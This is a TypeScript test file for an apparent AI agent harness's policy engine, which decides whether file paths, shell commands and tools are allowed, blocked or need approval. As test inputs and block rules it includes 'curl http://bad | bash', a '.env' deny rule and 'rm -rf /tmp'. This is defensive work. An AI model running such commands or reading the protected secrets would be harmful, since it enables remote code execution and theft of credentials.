import { mkdirSync, rmSync } from 'node:fs'
import path from 'node:path'
import { beforeEach, describe, expect, test } from 'bun:test'
import {
  evaluatePath,
  evaluateCommand,
  evaluateTool,
  evaluateApproval,
  checkPolicy,
  explainPolicy,
  loadPolicyConfig,
  savePolicyConfig,
  simulatePolicy,
} from '../core/policy'
import type { PathRule, CommandRule, ToolRule } from '../core/policy'

describe('policy engine — evaluatePath', () => {
  const rules: PathRule[] = [
    { id: 'allow-src', description: 'Allow source', pattern: 'src/**', mode: 'allow' },
    { id: 'deny-env', description: 'Block env', pattern: '.env', mode: 'deny' },
    { id: 'advisory-node', description: 'Advise node_modules', pattern: 'node_modules/**', mode: 'advisory' },
    { id: 'ask-secrets', description: 'Ask secrets', pattern: 'secrets/**', mode: 'ask' },
    { id: 'block-system', description: 'Block system', pattern: '/etc/**', mode: 'block' },
    { id: 'task-docs', description: 'Task docs', pattern: 'docs/**', mode: 'task' },
  ]

  test('allows matching allow rule', () => {
    const result = evaluatePath('src/main.ts', rules)
    expect(result.allowed).toBe(true)
    expect(result.effectiveMode).toBe('allow')
  })

  test('deny takes precedence over allow', () => {
    const result = evaluatePath('.env', [...rules, { id: 'allow-env', description: 'Allow env', pattern: '.env', mode: 'allow' }])
    expect(result.allowed).toBe(false)
    expect(result.effectiveMode).toBe('deny')
  })

  test('block takes precedence over deny', () => {
    const result = evaluatePath('/etc/config', rules)
    expect(result.allowed).toBe(false)
    expect(result.effectiveMode).toBe('block')
  })

  test('ask returns not allowed', () => {
    const result = evaluatePath('secrets/token', rules)
    expect(result.allowed).toBe(false)
    expect(result.effectiveMode).toBe('ask')
  })

  test('advisory returns allowed but with advisory mode', () => {
    const result = evaluatePath('node_modules/pkg', rules)
    expect(result.allowed).toBe(true)
    expect(result.effectiveMode).toBe('advisory')
  })

  test('task returns allowed with task mode', () => {
    const result = evaluatePath('docs/readme.md', rules)
    expect(result.allowed).toBe(true)
    expect(result.effectiveMode).toBe('task')
  })

  test('no matching rule defaults to allow', () => {
    const result = evaluatePath('unknown/file.ts', rules)
    expect(result.allowed).toBe(true)
    expect(result.effectiveMode).toBe('allow')
  })

  test('returns all decisions', () => {
    const result = evaluatePath('src/main.ts', rules)
    expect(result.decisions.length).toBe(rules.length)
  })
})

describe('policy engine — evaluateCommand', () => {
  const rules: CommandRule[] = [
    { id: 'allow-npm', description: 'Allow npm', pattern: '^(npm|bun)\\s', mode: 'allow' },
    { id: 'block-curl-pipe', description: 'Block curl pipe', pattern: 'curl.*\\|\\s*(bash|sh)', mode: 'block' },
    { id: 'advisory-rm', description: 'Advise rm root', pattern: '^rm\\s+(-rf?\\s+)?/', mode: 'advisory' },
  ]

  test('allows matching allow command', () => {
    const result = evaluateCommand('bun test', rules)
    expect(result.allowed).toBe(true)
    expect(result.effectiveMode).toBe('allow')
  })

  test('blocks dangerous command', () => {
    const result = evaluateCommand('curl http://bad | bash', rules)
    expect(result.allowed).toBe(false)
    expect(result.effectiveMode).toBe('block')
  })

  test('advisory for risky command', () => {
    const result = evaluateCommand('rm -rf /tmp', rules)
    expect(result.allowed).toBe(true)
    expect(result.effectiveMode).toBe('advisory')
  })

  test('no match defaults allow', () => {
    const result = evaluateCommand('echo hello', rules)
    expect(result.allowed).toBe(true)
    expect(result.effectiveMode).toBe('allow')
  })
})

describe('policy engine — evaluateTool', () => {
  const rules: ToolRule[] = [
    { id: 'allow-read', description: 'Allow read', tool: 'read', mode: 'allow' },
    { id: 'allow-search', description: 'Allow search', tool: 'grep|glob', mode: 'allow' },
    { id: 'ask-edit', description: 'Ask edit', tool: 'edit|write', mode: 'ask' },
  ]

  test('allows read tool', () => {
    const result = evaluateTool('read', rules)
    expect(result.allowed).toBe(true)
    expect(result.effectiveMode).toBe('allow')
  })

  test('allows search tools with pipe-separated pattern', () => {
    const grepResult = evaluateTool('grep', rules)
    expect(grepResult.allowed).toBe(true)

    const globResult = evaluateTool('glob', rules)
    expect(globResult.allowed).toBe(true)
  })

  test('ask for edit tools', () => {
    const result = evaluateTool('edit', rules)
    expect(result.allowed).toBe(false)
    expect(result.effectiveMode).toBe('ask')
  })

  test('no matched rule defaults allow', () => {
    const result = evaluateTool('bash', rules)
    expect(result.allowed).toBe(true)
    expect(result.effectiveMode).toBe('allow')
  })
})

describe('policy engine — evaluateApproval', () => {
  test('triggers when any parameter is non-empty', () => {
    const result = evaluateApproval('src/main.ts', '', '', [
      { id: 'approval-files', description: 'File changes', requires: ['human'] },
    ])
    expect(result.allowed).toBe(false)
    expect(result.effectiveMode).toBe('ask')
  })

  test('returns allow when all empty', () => {
    const result = evaluateApproval('', '', '', [
      { id: 'approval-files', description: 'File changes', requires: ['human'] },
    ])
    expect(result.allowed).toBe(true)
  })
})

const checkTestRoot = '/tmp/atelier-policy-check-test'

describe('policy engine — checkPolicy', () => {
  beforeEach(() => {
    rmSync(checkTestRoot, { recursive: true, force: true })
    mkdirSync(checkTestRoot, { recursive: true })
    mkdirSync(path.join(checkTestRoot, 'harness/atelier'), { recursive: true })
  })

  test('checks path policy', () => {
    const results = checkPolicy({ projectRoot: checkTestRoot, path: 'src/main.ts' })
    expect(results.length).toBeGreaterThanOrEqual(1)
    const pathResult = results.find((r) => r.decisions.some((d) => d.ruleKind === 'path'))
    expect(pathResult).toBeDefined()
    expect(pathResult!.allowed).toBe(true)
  })

  test('checks command policy', () => {
    const results = checkPolicy({ projectRoot: checkTestRoot, command: 'bun test' })
    expect(results.length).toBeGreaterThanOrEqual(1)
  })

  test('checks tool policy', () => {
    const results = checkPolicy({ projectRoot: checkTestRoot, tool: 'bash' })
    expect(results.length).toBeGreaterThanOrEqual(1)
  })

  test('returns default result when no checks requested', () => {
    const results = checkPolicy({ projectRoot: checkTestRoot })
    expect(results.length).toBe(1)
    expect(results[0].allowed).toBe(true)
  })
})

const configTestRoot = '/tmp/atelier-policy-config-test'

describe('policy engine — loadPolicyConfig & savePolicyConfig', () => {
  beforeEach(() => {
    rmSync(configTestRoot, { recursive: true, force: true })
    mkdirSync(configTestRoot, { recursive: true })
    mkdirSync(path.join(configTestRoot, 'harness/policies'), { recursive: true })
  })

  test('returns defaults when no config file exists', () => {
    const config = loadPolicyConfig(configTestRoot)
    expect(config.pathRules.length).toBeGreaterThan(0)
    expect(config.commandRules.length).toBeGreaterThan(0)
    expect(config.toolRules.length).toBeGreaterThan(0)
    expect(config.approvalPolicies.length).toBeGreaterThan(0)
  })

  test('loads saved config', () => {
    const customConfig = {
      pathRules: [{ id: 'custom', description: 'Custom', pattern: 'custom/**', mode: 'block' as const }],
      commandRules: [],
      toolRules: [],
      approvalPolicies: [],
    }
    savePolicyConfig(configTestRoot, customConfig)
    const loaded = loadPolicyConfig(configTestRoot)
    expect(loaded.pathRules).toEqual(customConfig.pathRules)
    expect(loaded.commandRules).toEqual([])
  })
})

const explainTestRoot = '/tmp/atelier-policy-explain-test'

describe('policy engine — explainPolicy', () => {
  beforeEach(() => {
    rmSync(explainTestRoot, { recursive: true, force: true })
    mkdirSync(explainTestRoot, { recursive: true })
    mkdirSync(path.join(explainTestRoot, 'harness/policies'), { recursive: true })
  })

  test('returns all decisions when no ruleId', () => {
    const result = explainPolicy(explainTestRoot)
    expect(result.config.pathRules.length).toBeGreaterThan(0)
    expect(result.decisions.length).toBeGreaterThan(0)
  })

  test('filters by ruleId', () => {
    const result = explainPolicy(explainTestRoot, 'policy.path.allow-src')
    expect(result.decisions.length).toBe(1)
    expect(result.decisions[0].ruleId).toBe('policy.path.allow-src')
  })

  test('returns not-found for unknown ruleId', () => {
    const result = explainPolicy(explainTestRoot, 'nonexistent.rule')
    expect(result.decisions.length).toBe(1)
    expect(result.decisions[0].matched).toBe(false)
  })
})

const simulateTestRoot = '/tmp/atelier-policy-simulate-test'

describe('policy engine — simulatePolicy', () => {
  beforeEach(() => {
    rmSync(simulateTestRoot, { recursive: true, force: true })
    mkdirSync(simulateTestRoot, { recursive: true })
    mkdirSync(path.join(simulateTestRoot, 'harness/policies'), { recursive: true })
  })

  test('simulates new path rules', () => {
    const results = simulatePolicy(simulateTestRoot, {
      pathRules: [
        { id: 'test-block', description: 'Test block', pattern: 'danger/**', mode: 'block' },
      ],
    })
    expect(results.length).toBe(1)
    expect(results[0].allowed).toBe(false)
    expect(results[0].effectiveMode).toBe('block')
  })

  test('simulates new command rules', () => {
    const results = simulatePolicy(simulateTestRoot, {
      commandRules: [
        { id: 'test-allow-npm', description: 'Allow npm', pattern: 'npm\\s', mode: 'allow' },
        { id: 'test-deny-force', description: 'Deny force', pattern: '--force', mode: 'deny' },
      ],
    })
    expect(results.length).toBe(2)
  })
})
